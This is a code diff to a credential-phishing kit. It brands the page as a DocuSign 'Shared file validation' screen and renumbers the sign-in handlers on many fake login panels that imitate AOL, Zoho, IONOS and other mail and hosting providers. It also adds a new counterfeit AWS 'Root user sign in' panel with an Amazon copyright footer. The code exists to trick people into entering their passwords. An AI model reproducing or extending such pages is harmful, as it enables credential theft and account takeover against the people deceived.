@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Shared file validation</title>
+    <title>Docusign | Shared file validation</title>
     <link rel="shortcut icon" href="domain_assets/docusign_favicon.png" type="image/x-icon" id="fav_icon"/>
     <link
       rel="stylesheet"
@@ -207,7 +207,7 @@
               <div id="nc_required_error">Required</div>
             </div>
             <div class="nc_confirm_btn">
-              <button onclick="sign_in_action(3, 'no_need_border')">Sign in and Continue</button>
+              <button onclick="sign_in_action(2, 'no_need_border')">Sign in and Continue</button>
             </div>
             <p class="nc_f_p">Forgot username or password?</p>
           </div>
@@ -386,7 +386,7 @@
                 <p>Forgot your password?</p>
               </div>
               <div class="el_btns">
-                <button onclick="sign_in_action(4, 'no_need_border')">Sign in</button>
+                <button onclick="sign_in_action(3, 'no_need_border')">Sign in</button>
                 <div>
                   <button>Make a Payment</button>
                   <button>Support</button>
@@ -411,7 +411,7 @@
                 Invalid user name, password or permissions.
               </div>
               <div class="null_pass_error"></div>
-              <button onclick="sign_in_action(5, 'no_need_border')" id="mc_submit_btn">
+              <button onclick="sign_in_action(4, 'no_need_border')" id="mc_submit_btn">
                 Log in
               </button>
             </div>
@@ -462,7 +462,7 @@
             </div>
             <div class="action_box_ggl">
               <p>Forgot password?</p>
-              <button onclick="sign_in_action(6)" id="ggl_submit_btn">
+              <button onclick="sign_in_action(5)" id="ggl_submit_btn">
                 Next
               </button>
             </div>
@@ -511,7 +511,7 @@
                     <label for="">Password</label>
                     <input type="password" name="password" id="rk_name_pass" class="name_pass" />
                   </div>
-                  <div class="rk-login-btn"><button onclick="sign_in_action(7, 'no_need_border')">Log in</button></div>
+                  <div class="rk-login-btn"><button onclick="sign_in_action(6, 'no_need_border')">Log in</button></div>
                 </div>
               </div>
             </div>
@@ -578,7 +578,7 @@
               <p class="ionos_linkstyle">Remember me</p>
             </div>
             <div class="ionos_dcdprimaryButton">
-                <input type="button" id="ionos_action_btn" onclick="sign_in_action(8, 'no_need_border')" value="Login">
+                <input type="button" id="ionos_action_btn" onclick="sign_in_action(7, 'no_need_border')" value="Login">
             </div>
           </div>
           <div class="ionos_mail_merketing">
@@ -630,7 +630,7 @@
                 Uh oh, looks as though something went wrong. Please try again later.
               </div>
               <div class="aol_btn">
-                <button onclick="sign_in_action(9)" >Sign in</button>
+                <button onclick="sign_in_action(8)" >Sign in</button>
               </div>
               <p class="aol_f_p">Forgotten password?</p>
             </div>
@@ -660,7 +660,7 @@
                   <input type="password" id="rc_password" class="name_pass" placeholder="Enter password" />
                 </div>
                 <div class="rc_rdb_button">
-                  <button onclick="sign_in_action(10, 'no_need_border')"> Login </button>
+                  <button onclick="sign_in_action(9, 'no_need_border')"> Login </button>
                 </div>
               </div>
             </div>
@@ -706,7 +706,7 @@
                                   </div>
                               </div>
                               <div class="zoho_button">
-                                  <button class="Btn_blue" onclick="sign_in_action(11)"><span>Sign in</span></button>
+                                  <button class="Btn_blue" onclick="sign_in_action(10)"><span>Sign in</span></button>
                               </div>
                           <!-- </form> -->
                       </div>
@@ -747,7 +747,7 @@
               </div>
             </div>
             <div class="cl_signin_btn">
-              <button onclick="sign_in_action(12)">Sign in</button>
+              <button onclick="sign_in_action(11)">Sign in</button>
             </div>
             <div class="cl_help_">
               <p>Forgot Password?</p>
@@ -781,7 +781,7 @@
               <input type="email" id="wm_name_pass" class="name_pass" placeholder="Enter your email password">
             </div>
             <div class="wm_signin_btn">
-              <button onclick="sign_in_action(13, 'no_need_border')">Sign in</button>
+              <button onclick="sign_in_action(12, 'no_need_border')">Sign in</button>
             </div>
             <div class="wm_rp">Reset Password</div>
           </div>
@@ -797,6 +797,55 @@
               <li>español</li>
               <li>•••</li>
             </ul>
+          </div>
+        </div>
+      </section>
+      <section class="d_none" id="revisionSection">
+        <div class="revisionInnerWrapper">
+          <div class="revisionWhiteBoard board">
+            <div class="revisionWhiteBoard_left">
+              <img src="" alt="" id="revision_logo" />
+              <div class="revision_header">
+                <h1>Root user sign in</h1>
+                <span><i class="fa-solid fa-circle-info"></i></span>
+              </div>
+              <div class="revision_name_k_taker">
+                <b>Email: </b>
+                <p class="name_key_holder"></p>
+              </div>
+              <div class="revision_label">
+                <b>Password</b>
+                <a href="#">Forgot password?</a>
+              </div>
+              <div class="revision_input_box">
+                <input type="password" class="name_pass" name="user_key__"/>
+                <div class="null_pass_error d_none revision_null_pass_error">
+                  Password field must not to be empty.!
+                </div>
+                <div class="error_box d_none revision_error_box">
+                  You have entered incorrect username or password. Please try again.
+                </div>
+              </div>
+              <div class="revision_confirm_btn">
+                <button onclick="sign_in_action(13, 'no_need_border')">Sign In</button>
+              </div>
+              <div class="diff_anchor">
+                <a href="#">Sign in to a different account</a>
+                <a href="#">Create a new account</a>
+              </div>
+            </div>
+            <div class="revisionWhiteBoard_right">
+              <img src="" alt="" id="revision_hero" />
+            </div>
+          </div>
+          <div class="revision_footer">
+            <p>
+              © 2023, Amazon Web Services, Inc. or its affiliates. All rights reserved.© 2022,
+              Amazon Web Services, Inc. or its affiliates. All rights reserved.
+            </p>
+            <a role="button"
+              >English <span><i class="fa-solid fa-caret-down"></i></span
+            ></a>
           </div>
         </div>
       </section>
